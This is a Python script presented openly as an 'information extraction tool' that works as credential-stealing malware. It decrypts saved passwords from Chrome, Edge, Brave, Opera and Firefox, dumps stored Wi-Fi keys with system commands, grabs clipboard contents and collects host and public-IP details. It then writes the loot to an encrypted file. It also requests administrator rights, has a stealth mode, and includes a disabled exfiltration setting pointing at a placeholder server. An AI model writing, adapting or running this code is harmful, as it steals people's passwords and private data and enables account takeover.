import os
import json
import base64
import sqlite3
import shutil
import platform
import socket
import re
import uuid
import requests
import pyperclip
import time
import random
import subprocess
import sys
import ctypes
import zlib
import hashlib
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
try:
    from win32crypt import CryptUnprotectData
except ImportError:
    pass  # Linux/macOS compatibility

# ========================
# COLOR CODES FOR OUTPUT
# ========================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def colored_print(text, color=Colors.WHITE, bold=False):
    """Print colored text with optional bold formatting"""
    if bold:
        print(f"{color}{Colors.BOLD}{text}{Colors.END}")
    else:
        print(f"{color}{text}{Colors.END}")

# ========================
# CONFIGURATION
# ========================
ENABLE_EXFIL = False  # Set True to exfiltrate data to a server
EXFIL_URL = "http://your-server.com/exfil"  # Change this!
DELAY_MIN = 1  # Minimum random delay between operations (seconds)
DELAY_MAX = 3  # Maximum random delay
STEALTH_MODE = False  # Minimize console output and delays
ENCRYPT_DATA = True  # Encrypt extracted data before saving
COMPRESS_DATA = True  # Compress extracted data

# ========================
# UTILITY FUNCTIONS
# ========================
def random_delay():
    if not STEALTH_MODE:
        time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

def get_os():
    os_name = platform.system()
    if os_name == "Windows":
        return "windows"
    elif os_name == "Linux":
        return "linux"
    elif os_name == "Darwin":
        return "macos"
    return "unknown"

def clean_temp_files():
    temp_files = ["temp_login_db.db", "temp_cookies_db.db"]
    for file in temp_files:
        if os.path.exists(file):
            try:
                os.remove(file)
            except:
                pass

def log_error(message):
    if not STEALTH_MODE:
        colored_print(f"[!] {message}", Colors.RED, bold=True)

def log_success(message):
    if not STEALTH_MODE:
        colored_print(f"[+] {message}", Colors.GREEN, bold=True)

def log_warning(message):
    if not STEALTH_MODE:
        colored_print(f"[!] {message}", Colors.YELLOW, bold=True)

def log_info(message):
    if not STEALTH_MODE:
        colored_print(f"[*] {message}", Colors.CYAN)

def log_header(message):
    if not STEALTH_MODE:
        colored_print(f"\n{'='*50}", Colors.PURPLE)
        colored_print(f"  {message}", Colors.PURPLE, bold=True)
        colored_print(f"{'='*50}", Colors.PURPLE)

def log_clean(message):
    if not STEALTH_MODE:
        colored_print(f"  {message}", Colors.WHITE)

def validate_path(path):
    return os.path.exists(path) if path else False

# ========================
# ENCRYPTION & COMPRESSION
# ========================
def generate_key(password="default_password", salt=None):
    if not salt:
        salt = get_random_bytes(16)
    key = PBKDF2(password, salt, dkLen=32, count=100000)
    return key, salt

def encrypt_data(data, key):
    try:
        if isinstance(data, str):
            data = data.encode('utf-8')
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return cipher.nonce + tag + ciphertext
    except Exception as e:
        log_error(f"Encryption failed: {e}")
        return None

def decrypt_data(encrypted_data, key):
    try:
        nonce = encrypted_data[:16]
        tag = encrypted_data[16:32]
        ciphertext = encrypted_data[32:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except Exception as e:
        log_error(f"Decryption failed: {e}")
        return None

def compress_data(data):
    try:
        return zlib.compress(data.encode('utf-8'))
    except Exception as e:
        log_error(f"Compression failed: {e}")
        return None

def decompress_data(compressed_data):
    try:
        return zlib.decompress(compressed_data).decode('utf-8')
    except Exception as e:
        log_error(f"Decompression failed: {e}")
        return None

# ========================
# PASSWORD EXTRACTION
# ========================
def get_decryption_key(browser_path):
    try:
        local_state_path = os.path.join(browser_path, 'Local State')
        if not validate_path(local_state_path):
            return None

        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.loads(file.read())
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
        
        try:
            key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception:
            return None
    except Exception:
        return None

def decrypt_password(password, key):
    try:
        if not isinstance(password, bytes):
            return None

        # Handle newer Chrome/Edge/Brave encryption (AES-GCM)
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            encrypted_password = password[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_password)
            return decrypted_pass.decode('utf-8')
        else:
            # Fallback to DPAPI for older versions
            try:
                decrypted_pass = CryptUnprotectData(password, None, None, None, 0)[1]
                return decrypted_pass.decode('utf-8') if decrypted_pass else None
            except Exception:
                return None
    except Exception:
        return None

def extract_browser_data(browser_name, browser_path):
    key = get_decryption_key(browser_path)
    if key is None:
        return {}

    credentials = {}
    profiles = [d for d in os.listdir(browser_path) if os.path.isdir(os.path.join(browser_path, d)) and (d.startswith('Profile') or d == 'Default')]

    for profile in profiles:
        login_db_path = os.path.join(browser_path, profile, 'Login Data')
        if validate_path(login_db_path):
            temp_db_path = os.path.join(os.getcwd(), 'temp_login_db.db')
            try:
                shutil.copy2(login_db_path, temp_db_path)
                conn = sqlite3.connect(temp_db_path)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                profile_credentials = []
                for row in cursor.fetchall():
                    origin_url, username, encrypted_password = row
                    if encrypted_password:  # Skip empty passwords
                        decrypted_password = decrypt_password(encrypted_password, key)
                        if decrypted_password:
                            profile_credentials.append({
                                'url': origin_url,
                                'username': username,
                                'password': decrypted_password
                            })
                credentials[f"{browser_name} {profile}"] = profile_credentials
                cursor.close()
                conn.close()
            except Exception:
                credentials[f"{browser_name} {profile}"] = []
            finally:
                if os.path.exists(temp_db_path):
                    os.remove(temp_db_path)
        else:
            credentials[f"{browser_name} {profile}"] = []
    return credentials

def extract_firefox_passwords():
    firefox_path = None
    if get_os() == "windows":
        firefox_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox')
    else:
        firefox_path = os.path.expanduser('~/.mozilla/firefox')
    
    if not validate_path(firefox_path):
        return {}

    profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d)) and (d.endswith('.default') or d.endswith('.default-release') or d.endswith('.esr'))]
    credentials = {}
    
    for profile in profiles:
        db_path = os.path.join(firefox_path, profile, 'logins.json')
        if validate_path(db_path):
            try:
                with open(db_path, 'r') as f:
                    data = json.load(f)
                    logins = data.get('logins', [])
                    profile_credentials = []
                    for login in logins:
                        profile_credentials.append({
                            'url': login.get('hostname'),
                            'username': login.get('username'),
                            'password': login.get('password')
                        })
                    credentials[f"Firefox {profile}"] = profile_credentials
            except Exception:
                credentials[f"Firefox {profile}"] = []
        else:
            credentials[f"Firefox {profile}"] = []
    return credentials

# ========================
# WI-FI PASSWORD EXTRACTION
# ========================
def extract_wifi_passwords():
    os_type = get_os()
    wifi_passwords = []

    if os_type == "windows":
        try:
            profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, text=True)
            profiles = re.findall(r': (.*)\r', profiles_output)

            for profile in profiles:
                try:
                    profile_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], shell=True, text=True)
                    password_match = re.search(r'Key Content\s*: (.*)\r', profile_output)
                    if password_match:
                        password = password_match.group(1).strip()
                        wifi_passwords.append({
                            'ssid': profile,
                            'password': password
                        })
                except subprocess.CalledProcessError:
                    continue
        except Exception:
            pass

    elif os_type == "linux":
        try:
            nmcli_output = subprocess.check_output(['nmcli', '-t', '-f', 'NAME,DEVICE', 'connection', 'show'], shell=True, text=True)
            connections = [line.split(':')[0] for line in nmcli_output.split('\n') if line]
            for conn in connections:
                try:
                    password_output = subprocess.check_output(['nmcli', '-s', '-g', '802-11-wireless-security.psk', 'connection', 'show', conn], shell=True, text=True)
                    if password_output.strip():
                        wifi_passwords.append({
                            'ssid': conn,
                            'password': password_output.strip()
                        })
                except subprocess.CalledProcessError:
                    continue
        except Exception:
            pass

    elif os_type == "macos":
        try:
            airport_output = subprocess.check_output(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'], shell=True, text=True)
            ssids = [line.split()[0] for line in airport_output.split('\n')[1:] if line]
            for ssid in ssids:
                try:
                    password_output = subprocess.check_output(['security', 'find-generic-password', '-wa', ssid], shell=True, text=True)
                    if password_output.strip():
                        wifi_passwords.append({
                            'ssid': ssid,
                            'password': password_output.strip()
                        })
                except subprocess.CalledProcessError:
                    continue
        except Exception:
            pass

    return wifi_passwords

# ========================
# SYSTEM INFO & CLIPBOARD
# ========================
def capture_clipboard():
    try:
        return pyperclip.paste()
    except Exception as e:
        log_error(f"Error capturing clipboard: {e}")
        return None

def steal_system_info():
    try:
        info = {
            'platform': platform.system(),
            'platform-release': platform.release(),
            'platform-version': platform.version(),
            'architecture': platform.machine(),
            'hostname': socket.gethostname(),
            'ip-address': socket.gethostbyname(socket.gethostname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor(),
        }

        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            global_ip = response.json().get('ip', 'N/A')
            info['global-ip-address'] = global_ip
        except:
            info['global-ip-address'] = 'Unavailable'

        return info
    except Exception as e:
        log_error("Error collecting system info.")
        return {}

# ========================
# MAIN EXECUTION
# ========================
if __name__ == '__main__':
    # Check and request admin rights on Windows
    if get_os() == "windows":
        try:
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit()
        except:
            log_error("Admin rights required for Wi-Fi extraction on Windows.")

    log_header("INFORMATION EXTRACTION TOOL")
    log_success("Starting info extraction...")
    extracted_data = {
        'metadata': {
            'timestamp': datetime.now().isoformat(),
            'system': get_os(),
            'hostname': socket.gethostname()
        },
        'passwords': {
            'browsers': {},
            'wifi': []
        },
        'system_info': {},
        'clipboard': None
    }

    # Browser Passwords
    log_info("Extracting browser passwords...")
    browser_results = {}
    
    if get_os() == "windows":
        browsers = {
            'Chrome': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Opera': os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
        }
        for name, path in browsers.items():
            if validate_path(path):
                browser_data = extract_browser_data(name, path)
                extracted_data['passwords']['browsers'].update(browser_data)
                total_creds = sum(len(creds) for creds in browser_data.values())
                browser_results[name] = total_creds
            else:
                browser_results[name] = "Not Found"
    
    # Firefox (Cross-platform)
    firefox_data = extract_firefox_passwords()
    if firefox_data:
        extracted_data['passwords']['browsers'].update(firefox_data)
        total_firefox = sum(len(creds) for creds in firefox_data.values())
        browser_results['Firefox'] = total_firefox
    else:
        browser_results['Firefox'] = "Not Found"

    # Wi-Fi Passwords
    log_info("Extracting Wi-Fi passwords...")
    wifi_passwords = extract_wifi_passwords()
    extracted_data['passwords']['wifi'] = wifi_passwords

    # Clipboard
    log_info("Capturing clipboard content...")
    clipboard_content = capture_clipboard()
    extracted_data['clipboard'] = clipboard_content

    # System Info
    log_info("Collecting system info...")
    system_info = steal_system_info()
    extracted_data['system_info'] = system_info

    # Save Locally
    log_info("Processing and saving extracted data...")
    output_data = json.dumps(extracted_data, indent=4)
    
    if ENCRYPT_DATA:
        key, salt = generate_key()
        encrypted_data = encrypt_data(output_data, key)
        if encrypted_data:
            with open("extracted_data.enc", "wb") as f:
                f.write(salt + encrypted_data)
            output_file = "extracted_data.enc"
        else:
            log_error("Failed to encrypt data")
            output_file = "None"
    else:
        if COMPRESS_DATA:
            compressed_data = compress_data(output_data)
            if compressed_data:
                with open("extracted_data.zlib", "wb") as f:
                    f.write(compressed_data)
                output_file = "extracted_data.zlib"
            else:
                log_error("Failed to compress data")
                output_file = "None"
        else:
            with open("extracted_data.json", "w") as f:
                f.write(output_data)
            output_file = "extracted_data.json"

    # Clean Summary Display
    log_header("EXTRACTION RESULTS")
    
    log_clean("🌐 BROWSER PASSWORDS:")
    for browser, count in browser_results.items():
        if count == "Not Found":
            log_clean(f"   {browser}: ❌ Not Found")
        elif count == 0:
            log_clean(f"   {browser}: ⚠️  No passwords found")
        else:
            log_clean(f"   {browser}: ✅ {count} passwords")
    
    log_clean("")
    log_clean("📶 WI-FI NETWORKS:")
    if wifi_passwords:
        log_clean(f"   Found: ✅ {len(wifi_passwords)} networks")
    else:
        log_clean("   Found: ❌ None (may need admin rights)")
    
    log_clean("")
    log_clean("📋 CLIPBOARD CONTENT:")
    if clipboard_content:
        log_clean("   Status: ✅ Captured")
    else:
        log_clean("   Status: ❌ Empty or access failed")
    
    log_clean("")
    log_clean("🖥️ SYSTEM INFORMATION:")
    log_clean(f"   OS: {system_info['platform']} {system_info['platform-release']}")
    log_clean(f"   Hostname: {system_info['hostname']}")
    log_clean(f"   IP Address: {system_info['ip-address']}")
    
    log_clean("")
    log_clean("💾 DATA STORAGE:")
    if output_file != "None":
        log_clean(f"   File: ✅ {output_file}")
        log_clean(f"   Location: {os.path.abspath(output_file)}")
    else:
        log_clean("   File: ❌ Failed to save")

    clean_temp_files()
    log_header("EXTRACTION COMPLETE! 🎉")
